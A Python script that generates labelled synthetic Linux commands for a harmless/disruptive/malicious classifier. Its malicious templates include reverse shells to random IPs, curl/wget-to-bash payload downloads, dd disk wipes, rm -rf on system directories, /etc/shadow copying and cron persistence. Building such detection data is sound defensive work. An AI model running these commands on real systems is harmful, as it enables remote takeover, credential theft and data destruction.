import json
import random
import os

def generate_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def generate_port():
    return random.randint(1024, 65535)

def generate_data(count=100000):
    data = []
    
    # Categories based on label distribution from existing data
    # 0: HARMLESS, 1: DISRUPTIVE, 2: MALICIOUS
    
    common_dirs = ["/", "/etc", "/root", "/var", "/boot", "/home/user", "/opt", "/tmp", "/usr/local/bin"]
    common_services = ["sshd", "docker", "apache2", "nginx", "postgresql", "mysql", "redis", "systemd-resolved"]
    common_interfaces = ["eth0", "wlan0", "ens33", "lo", "docker0"]
    
    # 2: MALICIOUS patterns (approx 1/3)
    malicious_templates = [
        "nc -e /bin/sh {ip} {port}",
        "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "rm -rf {dir}",
        "chown -R nobody:nobody {dir}",
        "chmod -R 777 {dir}",
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/zero of=/dev/nvme0n1",
        "cat /etc/shadow > {dir}/passwords.txt",
        "wget http://{ip}/payload.sh -O /tmp/m.sh && bash /tmp/m.sh",
        "curl -s http://{ip}/p | bash",
        "nmap -p- {ip}",
        "sqlmap -u http://{ip}/p?id=1 --dbs",
        "usermod -aG sudo {user}",
        "echo 'root:password123' | chpasswd",
        "crontab -l | {{ cat; echo '* * * * * /tmp/s.sh'; }} | crontab -"
    ]
    
    # 1: DISRUPTIVE patterns (approx 1/3)
    disruptive_templates = [
        "reboot",
        "shutdown -h now",
        "shutdown -r +5",
        "poweroff",
        "halt",
        "init 6",
        "init 0",
        "systemctl stop {service}",
        "systemctl restart {service}",
        "service {service} stop",
        "killall -9 {process}",
        "pkill -f '{process}'",
        "ifconfig {iface} down",
        "ip link set dev {iface} down",
        "ufw disable"
    ]
    
    # 0: HARMLESS patterns (approx 1/3)
    harmless_templates = [
        "ls -al {dir}",
        "pwd",
        "whoami",
        "date",
        "uptime",
        "df -h {dir}",
        "du -sh {dir}",
        "cat {dir}/test.txt",
        "grep -r 'info' {dir}",
        "echo 'Hello {msg}'",
        "top -n 1",
        "free -m",
        "ps aux | grep {process}",
        "ping -c 4 {ip}",
        "cat /etc/os-release"
    ]

    users = ["hacker", "guest", "admin", "testuser", "temp"]
    processes = ["python", "java", "node", "docker", "bash", "nginx"]
    messages = ["World", "Status", "Success", "Running", "Debug"]

    for i in range(count):
        label = i % 3
        if label == 2:
            template = random.choice(malicious_templates)
            text = template.format(
                ip=generate_ip(),
                port=generate_port(),
                dir=random.choice(common_dirs),
                user=random.choice(users)
            )
        elif label == 1:
            template = random.choice(disruptive_templates)
            text = template.format(
                service=random.choice(common_services),
                process=random.choice(processes),
                iface=random.choice(common_interfaces)
            )
        else:
            template = random.choice(harmless_templates)
            text = template.format(
                dir=random.choice(common_dirs),
                process=random.choice(processes),
                ip=generate_ip(),
                msg=random.choice(messages)
            )
            
        data.append({"text": text, "label": label})
    
    random.shuffle(data)
    
    os.makedirs("data", exist_ok=True)
    with open("data/linux_commands_3class_val.json", "w") as f:
        json.dump(data, f, indent=4)
    
    print(f"Generated {len(data)} items in data/linux_commands_3class_val.json")

if __name__ == "__main__":
    generate_data(100000)
